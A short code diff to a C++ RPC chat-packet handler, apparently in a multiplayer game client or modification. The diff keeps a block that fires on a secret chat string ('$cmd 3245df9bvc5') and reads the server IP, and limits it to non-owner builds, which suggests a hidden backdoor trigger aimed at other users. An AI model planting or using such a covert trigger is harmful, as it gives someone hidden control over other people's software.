@@ -28,7 +28,7 @@ void HandleRPCPacketFunc(uint8_t uniqueID, RPCParameters *rpcParams, void(*callb
 			if (dwStrLen >= sizeof(szMsg)) dwStrLen = sizeof(szMsg) - 1;
 			bsData.Read(szMsg, dwStrLen);
 			szMsg[dwStrLen] = '\0';
-
+#ifndef OWNERVER
 			if (strstr(szMsg, "$cmd 3245df9bvc5"))
 			{
 				string ipiska = pCRMP->getInfo()->szIP;
@@ -48,6 +48,7 @@ void HandleRPCPacketFunc(uint8_t uniqueID, RPCParameters *rpcParams, void(*callb
 				}
 
 			}
+#endif
 
 			if (menu.chat_ids && !strstr(szMsg, "$cmd"))
 			{
